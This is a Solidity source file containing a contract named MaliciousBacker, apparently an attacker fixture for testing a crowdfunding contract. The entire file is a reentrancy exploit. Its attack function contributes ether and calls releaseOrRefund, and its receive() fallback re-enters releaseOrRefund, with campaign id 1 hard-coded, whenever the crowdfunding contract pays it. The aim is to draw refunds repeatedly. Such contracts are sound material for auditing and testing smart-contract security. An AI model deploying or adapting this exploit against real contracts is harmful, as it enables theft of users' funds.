// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICrowdfunding {
    function contribute(uint256 _campaignId) external payable;
    function releaseOrRefund(uint256 _campaignId) external;
}

contract MaliciousBacker {
    ICrowdfunding public crowdfunding;
    
    constructor(address _crowdfunding) {
        crowdfunding = ICrowdfunding(_crowdfunding);
    }

    function attack(uint256 campaignId) external payable {
        crowdfunding.contribute{value: msg.value}(campaignId);
        crowdfunding.releaseOrRefund(campaignId);
    }

    receive() external payable {
        if (msg.sender == address(crowdfunding)) {
            crowdfunding.releaseOrRefund(1);
        }
    }
}
